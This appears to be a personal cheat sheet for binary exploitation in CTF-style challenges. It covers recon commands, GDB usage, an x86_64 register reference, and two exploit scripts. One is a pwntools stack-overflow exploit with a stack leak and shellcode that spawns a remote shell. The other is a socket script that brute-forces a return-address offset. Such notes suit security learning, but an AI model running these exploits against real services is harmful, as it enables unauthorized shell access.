---
title: Pwn Binaries
---

# Pwn Binaries

```
file some-executable
checksec --file=some-executable
strace ./some-executable
rtrace ./some-executable
```

### GDB
- [gdb-peda](https://github.com/longld/peda)

```
gdb some-executable
(gdb) info break
(gdb) info registers
(gdb) disassemble <fn-name>
(gdb) break *0x000055555555539c
(gdb) run
(gdb) stepi
(gdb) continue
```
```
# stripped workflow
(gdb) run
(gdb) info file                 # look for entry point
(gdb) break *0x555555555080
(gdb) run
(gdb) x/1000i $rip              # list 1k lines from instruction pointer
(gdb) x/1000i 0x5555555558dd    # list 1k lines from address
```
```
(gdb) x/20wx $esp               # view 20 words starting from esp
(gdb) delete 1                  # delete breakpoint
(gdb) delete                    # delete all breakpoints
```

### Assembly stuff
#### Registers
```
Registers with an "E" prefix, like EAX, represent the lower 32 bits of the corresponding register in x86 (32-bit) architecture.
Registers with an "R" prefix, like RAX, represent the 64-bit version in x86_64 architecture.

RAX: Accumulator Register, used for arithmetic, logic, io operations, etc.
RBX: Base Register, used as a pointer to data.
RCX: Counter Register, often used to store loop counters.
RDX: Data Register, used in arithmetic operations and io operations.
R8 to R15: Additional General-Purpose Registers

RSI: Source Index, often used as a pointer to the source in stream operations.
RDI: Destination Index, often used as a pointer to the destination in stream operations.

RSP: Stack Pointer, top of the stack.
RBP: Base Pointer, base of the stack frame.
RIP: Instruction Pointer, next instruction to be executed.
``` 

### Pwntools

```python
from pwn import *

def main():
    context.log_level = 'DEBUG'
    context(os='linux', arch='amd64')

    # io = process('./binary_file')
    io = remote('x.x.x.x', 30774)
    password = 'w00tw00t'

    return_address_offset = 84
    max_payload_length = 137

    io.sendlineafter('> ', b'1')
    stack_address = io.recvline().strip().split()[-1]
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)])
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address, endian="big")
    log.success(f'Leaked stack address: {p64(stack_address)}')

    io.sendlineafter('> ', b'2')
    io.sendlineafter('password: ', password.encode())

    shellcode = asm(
            shellcraft.popad() +
            shellcraft.sh()
    )

    padding = b'a' * (return_address_offset - len(shellcode))
    payload = shellcode + padding + p64(stack_address)
    assert len(payload) <= max_payload_length, f'Payload too big. "{len(payload)}"'

    io.sendlineafter('commands: ', payload)
    io.sendlineafter('> ', b'3')
    io.interactive()

if __name__ == '__main__':
    main()
```

```python
from pwn import *

pattern = cyclic(100) # 100 bytes long
offset = cyclic_find('vaaa')
```

#### Without pwntools
##### Basic python socket
```python
import socket
import time

def exploit(ip, port, x):
    payload = b"A" * x
    payload += b"\xb3\xba\x37\x13"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    time.sleep(0.3)

    s.sendall(payload + b"\n")
    print(s.recv(2048).decode(errors="ignore"))
    s.close()

for i in range(44, 80):
    exploit("x.x.x.x", 8080, i)
```